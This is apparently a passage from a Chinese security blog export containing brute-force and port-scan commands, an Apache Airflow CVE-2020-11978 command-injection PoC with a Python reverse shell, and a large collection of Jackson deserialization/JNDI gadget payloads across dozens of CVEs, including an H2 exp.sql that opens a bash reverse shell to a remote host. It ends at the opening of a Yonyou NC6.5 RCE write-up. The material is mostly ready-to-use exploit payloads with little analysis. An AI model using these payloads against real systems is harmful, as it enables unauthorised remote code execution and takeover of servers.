<p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
<p>一句话运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python OneForAll.py --target xx.com run</span><br></pre></td></tr></table></figure>
<h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h2 id="AssetsHunter"><a href="#AssetsHunter" class="headerlink" title="AssetsHunter"></a>AssetsHunter</h2><p>一款快速优秀的探测/爆破工具</p>
<p><a href="https://github.com/rabbitmask/AssetsHunter">https://github.com/rabbitmask/AssetsHunter</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis爆破：</span><br><span class="line">python AssetsHunter.py -redisc 127.0.0.1 -p 6379 -l 1</span><br><span class="line">mysql爆破：</span><br><span class="line">python AssetsHunter.py -mysqlc 127.0.0.1 -u root -p 3306 -l 1</span><br><span class="line">ftp爆破：</span><br><span class="line">python AssetsHunter.py -ftpc 127.0.0.1 -p 21 -u rabbit -l 1</span><br><span class="line">ssh爆破：</span><br><span class="line">python AssetsHunter.py -sshc 127.0.0.1 -p 22 -u root -l 1</span><br><span class="line">信息泄露探测：</span><br><span class="line">python AssetsHunter.py -inforisk http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">whatcms</span><br><span class="line">python AssetsHunter.py -whatcms http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">C段探测</span><br><span class="line">python AssetsHunter.py -hawkeye 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>这还说什么呢？打！</p>
<p>masscan并不好用</p>
<h2 id="Wfuzz"><a href="#Wfuzz" class="headerlink" title="Wfuzz"></a>Wfuzz</h2><p>Wfuzz其实可以用来跑端口，很简单暴力。对于某些有奇葩防护，开了虚假全端口的站，有奇效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z range,1-65536 --hc 404,403 --hw 0 --req-delay 1 --conn-delay 1 -Z URL</span><br><span class="line">wfuzz -c -z range,8000-9000 --hl 0 --req-delay 1 --conn-delay 1 -Z URL</span><br></pre></td></tr></table></figure>
<p>不管是hc还是sc，hl还是sl，找合适的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--hc&#x2F;hl&#x2F;hw&#x2F;hh N[,N]+ : 以指定的返回码&#x2F;行数&#x2F;字数&#x2F;字符数作为判断条件隐藏返回结果</span><br><span class="line">--sc&#x2F;sl&#x2F;sw&#x2F;sh N[,N]+ : 以指定的返回码&#x2F;行数&#x2F;字数&#x2F;字符数作为判断条件显示返回结果</span><br></pre></td></tr></table></figure>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>其他的就是各种技巧了，比如whois查备案联系人，联系人再反查域名，拿到二级域名后再去查三级域名，三级域名解析后再去C段等等无限人工递归查询。还有单位名称工商注册查询、域名备案号查询之类的，实在不行去企查查、天眼查去查查二级单位什么的。</p>
<h1 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h1>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Airflow</title>
    <url>/2021/01/14/Apache-Airflow/</url>
    <content><![CDATA[<p><em>Apache-Airflow是Airbnb开源的一款数据流程工具，目前是Apache孵化项目。</em><a id="more"></a></p>
<h1 id="CVE-2020-11978-RCE"><a href="#CVE-2020-11978-RCE" class="headerlink" title="CVE-2020-11978-RCE"></a>CVE-2020-11978-RCE</h1><p>Apache Airflow 1.10.10及之前版本中的 example DAGs存在操作系统命令注入漏洞。</p>
<p>example_trigger_target_dag</p>
<p><img src="/images/3.png" alt="3"></p>
<p><img src="/images/1.png" alt="1"></p>
<p>检测Poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;ping s5pjot.dnslog.cn\&quot;;#&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>反弹Poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;python -c \&quot;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;x.x.x.x&#39;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;sh&#39;,&#39;-i&#39;])\&quot;;#&quot;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Poc</category>
      </categories>
      <tags>
        <tag>Apache Airflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Jackson</title>
    <url>/2021/01/15/Jackson/</url>
    <content><![CDATA[<p><em>Jackson 是一个 Java 的用来处理 JSON 格式数据的类库，多为JNDI注入</em>。<a id="more"></a></p>
<h1 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;,&quot;http</span><br><span class="line">:&#x2F;&#x2F;远端vps地址&#x2F;spel.xml&quot;]&#125;</span><br><span class="line"></span><br><span class="line">spel.xml</span><br><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;whatever&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2017-15095"><a href="#CVE-2017-15095" class="headerlink" title="CVE-2017-15095"></a>CVE-2017-15095</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;,&quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1-2-45"></a>1-2-45</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&#123;&quot;properties&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1-2-68"></a>1-2-68</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&#123;&quot;resourceName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&#123;&quot;metricRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&#123;&quot;jndiNames&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-12022"><a href="#CVE-2018-12022" class="headerlink" title="CVE-2018-12022"></a>CVE-2018-12022</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;jodd.db.connection.DataSourceConnectionProvider&quot;,&quot;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-12023"><a href="#CVE-2018-12023" class="headerlink" title="CVE-2018-12023"></a>CVE-2018-12023</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&#123;&quot;xadataSourceName&quot;:&quot;ssiipp&quot;,&quot;logWriter&quot;:null&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-19360"><a href="#CVE-2018-19360" class="headerlink" title="CVE-2018-19360"></a>CVE-2018-19360</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.axis2.transport.jms.JMSOutTransportInfo&quot;, &quot;jms:&#x2F;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-19361"><a href="#CVE-2018-19361" class="headerlink" title="CVE-2018-19361"></a>CVE-2018-19361</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.openjpa.ee.JNDIManagedRuntime&quot;,&#123;&quot;transactionManagerName&quot;:&quot;ssiipp&quot;, &quot;rollbackOnly&quot;:null&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-5968"><a href="#CVE-2018-5968" class="headerlink" title="CVE-2018-5968"></a>CVE-2018-5968</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.hibernate.jmx.StatisticsService&quot;,&#123;&quot;sessionFactoryJNDIName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-7489"><a href="#CVE-2018-7489" class="headerlink" title="CVE-2018-7489"></a>CVE-2018-7489</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&#123;&quot;jndiName&quot;:&quot;ssiipp&quot;,&quot;loginTimeout&quot;:0&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-12384"><a href="#CVE-2019-12384" class="headerlink" title="CVE-2019-12384"></a>CVE-2019-12384</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&#39;&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">exp.sql</span><br><span class="line">CREATE ALIAS SHELLEXEC AS $ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        String[] command &#x3D; &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$;</span><br><span class="line">CALL SHELLEXEC(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.136.129&#x2F;7777 0&gt;&amp;1&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14379"><a href="#CVE-2019-14379" class="headerlink" title="CVE-2019-14379"></a>CVE-2019-14379</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup&quot;,&#123;&quot;properties&quot;:&#123;&quot;jndiName&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14439"><a href="#CVE-2019-14439" class="headerlink" title="CVE-2019-14439"></a>CVE-2019-14439</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14540"><a href="#CVE-2019-14540" class="headerlink" title="CVE-2019-14540"></a>CVE-2019-14540</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.zaxxer.hikari.HikariConfig&quot;, &#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14892"><a href="#CVE-2019-14892" class="headerlink" title="CVE-2019-14892"></a>CVE-2019-14892</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.configuration.JNDIConfiguration&quot;, &#123;&quot;prefix&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;, &#123;&quot;prefix&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14893"><a href="#CVE-2019-14893" class="headerlink" title="CVE-2019-14893"></a>CVE-2019-14893</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16335"><a href="#CVE-2019-16335" class="headerlink" title="CVE-2019-16335"></a>CVE-2019-16335</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.zaxxer.hikari.HikariDataSource&quot;, &#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16942"><a href="#CVE-2019-16942" class="headerlink" title="CVE-2019-16942"></a>CVE-2019-16942</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.dbcp.datasources.SharedPoolDataSource&quot;,&#123;&quot;dataSourceName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16943"><a href="#CVE-2019-16943" class="headerlink" title="CVE-2019-16943"></a>CVE-2019-16943</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.p6spy.engine.spy.P6DataSource&quot;, &#123;&quot;realDataSource&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-17267"><a href="#CVE-2019-17267" class="headerlink" title="CVE-2019-17267"></a>CVE-2019-17267</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup&quot;,&#123;&quot;properties&quot;: &#123;&quot;jndiName&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-17531"><a href="#CVE-2019-17531" class="headerlink" title="CVE-2019-17531"></a>CVE-2019-17531</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.log4j.receivers.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-10672"><a href="#CVE-2020-10672" class="headerlink" title="CVE-2020-10672"></a>CVE-2020-10672</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-10673"><a href="#CVE-2020-10673" class="headerlink" title="CVE-2020-10673"></a>CVE-2020-10673</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.caucho.config.types.ResourceRef&quot;,&#123;&quot;lookupName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11111"><a href="#CVE-2020-11111" class="headerlink" title="CVE-2020-11111"></a>CVE-2020-11111</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.jms.pool.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.jms.pool.JcaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.pool.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.pool.JcaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11113"><a href="#CVE-2020-11113" class="headerlink" title="CVE-2020-11113"></a>CVE-2020-11113</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.openjpa.ee.WASRegistryManagedRuntime&quot;,&#123;&quot;registryName&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11619"><a href="#CVE-2020-11619" class="headerlink" title="CVE-2020-11619"></a>CVE-2020-11619</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.aop.config.MethodLocatingFactoryBean&quot;,&#123;&quot;targetBeanName&quot;: &quot;ssiipp&quot;,&quot;methodName&quot;:&quot;Foo&quot;,&quot;beanFactory&quot;:[&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,&#123;&quot;shareableResources&quot;:[&quot;ssiipp&quot;]&#125;]&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.beans.factory.config.BeanReferenceFactoryBean&quot;,&#123;&quot;targetBeanName&quot;: &quot;ssiipp&quot;,&quot;beanFactory&quot;:[&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,&#123;&quot;shareableResources&quot;:[&quot;ssiipp&quot;]&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11620"><a href="#CVE-2020-11620" class="headerlink" title="CVE-2020-11620"></a>CVE-2020-11620</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.jelly.impl.Embedded&quot;,&#123;&quot;script&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">spel.xml</span><br><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;whatever&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14060"><a href="#CVE-2020-14060" class="headerlink" title="CVE-2020-14060"></a>CVE-2020-14060</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oadd.org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;sip&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14061"><a href="#CVE-2020-14061" class="headerlink" title="CVE-2020-14061"></a>CVE-2020-14061</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oracle.jms.AQjmsQueueConnectionFactory&quot;,&quot;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14062"><a href="#CVE-2020-14062" class="headerlink" title="CVE-2020-14062"></a>CVE-2020-14062</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14195"><a href="#CVE-2020-14195" class="headerlink" title="CVE-2020-14195"></a>CVE-2020-14195</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.jsecurity.realm.jndi.JndiRealmFactory&quot;,&#123;&quot;jndiNames&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-8840"><a href="#CVE-2020-8840" class="headerlink" title="CVE-2020-8840"></a>CVE-2020-8840</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;, &#123;&quot;AsText&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9546"><a href="#CVE-2020-9546" class="headerlink" title="CVE-2020-9546"></a>CVE-2020-9546</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9547"><a href="#CVE-2020-9547" class="headerlink" title="CVE-2020-9547"></a>CVE-2020-9547</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&#123;&quot;properties&quot;: &#123;&quot;UserTransaction&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9548"><a href="#CVE-2020-9548" class="headerlink" title="CVE-2020-9548"></a>CVE-2020-9548</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-35728"><a href="#CVE-2020-35728" class="headerlink" title="CVE-2020-35728"></a>CVE-2020-35728</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-36179-36182"><a href="#CVE-2020-36179-36182" class="headerlink" title="CVE-2020-36179 ~ 36182"></a>CVE-2020-36179 ~ 36182</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">exp.sql</span><br><span class="line">    CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">    $$;</span><br><span class="line">    CALL SHELLEXEC(&#39;calc.exe&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-36184"><a href="#CVE-2020-36184" class="headerlink" title="CVE-2020-36184"></a>CVE-2020-36184</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource&quot;, &#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<p>2021-1-15</p>
]]></content>
      <categories>
        <category>Poc</category>
      </categories>
      <tags>
        <tag>Jackson</tag>
      </tags>
  </entry>
  <entry>
    <title>用友NC6.5反序列化JNDI注入远程代码执行复现</title>
    <url>/2021/01/25/%E7%94%A8%E5%8F%8BNC6-5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JNDI%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>用友NC6.5版本中存在JAVA反序列化远程命令执行漏洞。<a id="more"></a>2020年中的漏洞，虽然是老漏洞，但我感觉修的不多。</p>
